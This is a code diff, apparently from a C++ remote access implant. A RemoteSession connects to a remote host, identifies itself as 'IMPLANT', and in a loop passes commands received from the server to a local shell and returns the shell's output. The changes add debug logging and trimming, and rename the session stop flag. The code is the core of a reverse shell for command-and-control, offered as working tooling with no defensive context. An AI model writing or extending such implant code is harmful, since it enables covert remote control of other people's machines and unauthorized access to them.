@@ -39,14 +39,21 @@ public:
             //identify to the server
             conn.sendline("IMPLANT");
 
+            logger::debug("global_running: {} | Connection: {} | Shell: {}", global_running ? "TRUE" : "FALSE", conn.is_alive() ? "TRUE" : "FALSE", shell.is_alive() ? "TRUE" : "FALSE");
+
             while (global_running && conn.is_alive() && shell.is_alive()) {
-                shell.send(conn.recvline());
-                conn.send(shell.recvall());
+                const auto cmd = trim_string(conn.recvline());
+                logger::debug("Shell Command: [{}]", cmd);
+                shell.sendline(cmd);
+
+                const auto output =  trim_string(shell.recvline());
+                logger::debug("Output: [{}]", output);
+                conn.sendline(output);
             }
         } catch (const std::exception& e) {
-            logger::debug("Session {} encountered error: {}", session_id, e.what());
+            logger::debug("Session [{}] encountered error: {}", session_id, e.what());
         }
-        logger::debug("Session {} closed.", session_id);
+        logger::debug("Session [{}] closed.", session_id);
     }
 };
 
@@ -57,7 +64,7 @@ class SessionManager {
 private:
     struct SessionEntry {
         std::thread worker;
-        std::atomic<bool> stop_flag{false};
+        std::atomic<bool> running_flag{true};
     };
 
     std::map<std::string, std::unique_ptr<SessionEntry>> sessions;
@@ -74,8 +81,8 @@ public:
         auto entry = std::make_unique<SessionEntry>();
 
         // Spawn the shell thread
-        entry->worker = std::thread([id, host, port, &stop = entry->stop_flag]() -> void {
-            RemoteSession session(id, host, port, stop);
+        entry->worker = std::thread([id, host, port, &run = entry->running_flag]() -> void {
+            RemoteSession session(id, host, port, run);
             session.run();
         });
 
@@ -89,7 +96,7 @@ public:
         std::lock_guard lock(mtx);
         if (sessions.size() > 0) {
             for(auto& [id, session] : sessions) {
-                session->stop_flag = true;
+                session->running_flag = false;
                 if (session->worker.joinable()) {
                     session->worker.detach();
                 }
